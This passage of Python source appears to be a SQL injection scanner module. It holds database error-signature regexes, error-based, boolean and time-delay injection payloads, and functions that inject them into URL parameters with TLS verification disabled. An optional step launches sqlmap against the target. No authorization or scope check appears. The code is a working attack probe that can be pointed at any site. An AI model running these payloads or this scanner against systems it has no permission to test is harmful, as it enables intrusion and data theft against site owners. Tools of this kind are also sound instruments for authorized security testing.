        r"sqlite_array_query",
        r"sqlite.*error",
        r"sqliteexception",
    ],
    "oracle": [
        r"oracle error",
        r"ora-[0-9]{5}",
        r"oracle.*driver",
    ],
    "generic": [
        r"sql syntax",
        r"syntax error",
        r"unexpected end of sql",
        r"unterminated string",
    ],
}

ERROR_PAYLOADS = ["'", '"', "\\", "';--", '";--', "1'1", "1 AND 1=1", "1 AND 1=2"]

BOOLEAN_PAIRS = [
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2"),
]

TIME_PAYLOADS = {
    "mysql": "1; SELECT SLEEP(3)--",
    "mssql": "1; WAITFOR DELAY '0:0:3'--",
    "postgresql": "1; SELECT pg_sleep(3)--",
    "generic": "1; SELECT SLEEP(3)--",
}


def _detect_db_error(text: str) -> Optional[str]:
    lower = text.lower()
    for db, patterns in DB_ERRORS.items():
        for pattern in patterns:
            if re.search(pattern, lower):
                return db
    return None


def _inject_param(url: str, param: str, payload: str) -> str:
    from urllib.parse import urlparse, parse_qs, urlencode
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    flat = {k: v[0] for k, v in params.items()}
    return parsed._replace(query=urlencode(flat)).geturl()


def _get_params(url: str) -> list[str]:
    return list(parse_qs(urlparse(url).query).keys())


def scan_sqli_error(url: str, timeout: int = 8) -> list:
    findings = []
    params = _get_params(url) or ["id", "q", "search", "page", "cat"]
    for param in params:
        for payload in ERROR_PAYLOADS:
            inject_url = _inject_param(url, param, payload)
            try:
                resp = SESSION.get(inject_url, timeout=timeout, verify=False)
                db = _detect_db_error(resp.text)
                if db:
                    findings.append({
                        "type": "error_based",
                        "param": param,
                        "payload": payload,
                        "db": db,
                        "url": inject_url,
                        "confirmed": True,
                    })
                    logger.info(f"SQLi error-based: {inject_url} [{db}]")
                    break
            except requests.RequestException as exc:
                logger.debug(f"SQLi error probe failed: {exc}")
    return findings


def scan_sqli_boolean(url: str, timeout: int = 8) -> list:
    findings = []
    params = _get_params(url) or ["id", "q", "search"]
    try:
        baseline = SESSION.get(url, timeout=timeout, verify=False)
        baseline_len = len(baseline.text)
    except requests.RequestException:
        return []

    for param in params:
        for true_payload, false_payload in BOOLEAN_PAIRS:
            try:
                true_resp = SESSION.get(_inject_param(url, param, true_payload), timeout=timeout, verify=False)
                false_resp = SESSION.get(_inject_param(url, param, false_payload), timeout=timeout, verify=False)
                diff = abs(len(true_resp.text) - len(false_resp.text))
                true_diff = abs(len(true_resp.text) - baseline_len)
                if diff > 50 and true_diff < 100:
                    findings.append({
                        "type": "boolean_based",
                        "param": param,
                        "true_payload": true_payload,
                        "false_payload": false_payload,
                        "response_diff": diff,
                        "url": url,
                        "confirmed": True,
                    })
                    logger.info(f"SQLi boolean-based: {url} param={param}")
                    break
            except requests.RequestException:
                continue
    return findings


def scan_sqli_time(url: str, timeout: int = 10, sleep_seconds: int = 3) -> list:
    findings = []
    params = _get_params(url) or ["id", "q", "search"]
    for param in params:
        for db, payload in TIME_PAYLOADS.items():
            inject_url = _inject_param(url, param, payload)
            try:
                start = time.monotonic()
                SESSION.get(inject_url, timeout=timeout + sleep_seconds + 2, verify=False)
                elapsed = time.monotonic() - start
                if elapsed >= sleep_seconds:
                    findings.append({
                        "type": "time_based",
                        "param": param,
                        "payload": payload,
                        "db_hint": db,
                        "elapsed": round(elapsed, 2),
                        "url": inject_url,
                        "confirmed": True,
                    })
                    logger.info(f"SQLi time-based: {inject_url} [{db}] elapsed={elapsed:.1f}s")
                    break
            except requests.RequestException:
                continue
    return findings


def run_sqlmap(url: str, params: Optional[list] = None, timeout: int = 120) -> dict:
    if not shutil.which("sqlmap"):
        return {"available": False, "message": "sqlmap not found in PATH"}
    cmd = ["sqlmap", "-u", url, "--batch", "--level=2", "--risk=1", "--output-dir=/tmp/sqlmap_out"]
    if params:
        cmd += ["-p", ",".join(params)]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=False)
        output = result.stdout + result.stderr
        vuln = "is vulnerable" in output.lower() or "parameter" in output.lower() and "injectable" in output.lower()
        return {"available": True, "vulnerable": vuln, "output": output[-3000:]}
    except subprocess.TimeoutExpired:
        return {"available": True, "vulnerable": False, "output": "sqlmap timed out"}
    except Exception as exc:
        return {"available": True, "vulnerable": False, "output": str(exc)}


def scan_sqli(url: str, run_sqlmap_flag: bool = False) -> dict:
    all_findings = []
    all_findings += scan_sqli_error(url)
    all_findings += scan_sqli_boolean(url)
    all_findings += scan_sqli_time(url)

    sqlmap_result = {}
    if run_sqlmap_flag and all_findings:
        sqlmap_result = run_sqlmap(url)

    db_types = list({f.get("db") or f.get("db_hint", "unknown") for f in all_findings})

    return {
        "url": url,
        "findings": all_findings,
        "vulnerable": len(all_findings) > 0,
        "finding_count": len(all_findings),
        "db_types_detected": db_types,
        "sqlmap": sqlmap_result,
    }
